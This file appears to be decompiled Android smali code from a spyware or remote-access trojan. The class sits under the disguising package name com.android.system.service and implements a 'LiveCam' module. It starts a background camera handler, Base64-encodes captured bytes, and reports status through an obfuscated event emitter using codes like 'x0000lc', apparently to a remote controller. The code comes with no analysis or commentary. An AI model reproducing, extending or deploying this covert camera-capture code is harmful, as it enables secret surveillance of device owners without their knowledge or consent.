.class public Lcom/android/system/service/o;
.super Ljava/lang/Object;
.source ""


.field private static volatile a:Z

.field private static volatile b:Landroid/hardware/Camera;

.field private static c:I

.field private static d:Landroid/os/Handler;


.method public static a(I)V
    .locals 7

    :try_start_0
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "LiveCam"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    const/4 v1, 0x0

    :goto_wait
    mul-int/lit8 v2, v1, 0x32

    const/16 v3, 0x1388

    if-lt v2, v3, :cond_0

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "error"

    const-string v2, "LiveCam: looper timeout"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lcom/android/system/service/e;->a()Lcom/android/system/service/e;

    move-result-object v1

    invoke-virtual {v1}, Lcom/android/system/service/e;->b()Lb/a/b/e;

    move-result-object v1

    const-string v2, "x0000lc"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-virtual {v1, v2, v3}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    return-void

    :cond_0
    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v2

    if-eqz v2, :cond_1

    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    sput p0, Lcom/android/system/service/o;->c:I

    const/4 p0, 0x1

    sput-boolean p0, Lcom/android/system/service/o;->a:Z

    new-instance p0, Lcom/android/system/service/o$b;

    invoke-direct {p0}, Lcom/android/system/service/o$b;-><init>()V

    sget-object v0, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    invoke-virtual {v0, p0}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_done

    :cond_1
    const-wide/16 v2, 0x32

    invoke-static {v2, v3}, Landroid/os/SystemClock;->sleep(J)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_wait

    :goto_done
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_exit

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "error"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "LiveCam: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lcom/android/system/service/e;->a()Lcom/android/system/service/e;

    move-result-object p0

    invoke-virtual {p0}, Lcom/android/system/service/e;->b()Lb/a/b/e;

    move-result-object p0

    const-string v1, "x0000lc"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    invoke-virtual {p0, v1, v2}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :goto_exit
    return-void
.end method

.method public static b()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/android/system/service/o;->a:Z

    sget-object v0, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    if-eqz v0, :cond_0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    sput-object v1, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    :cond_0
    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    const/4 v0, 0x0

    sput-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    :cond_1
    return-void
.end method

.method public static c([B)Ljava/lang/String;
    .locals 1

    const/4 v0, 0x0

    invoke-static {p0, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method
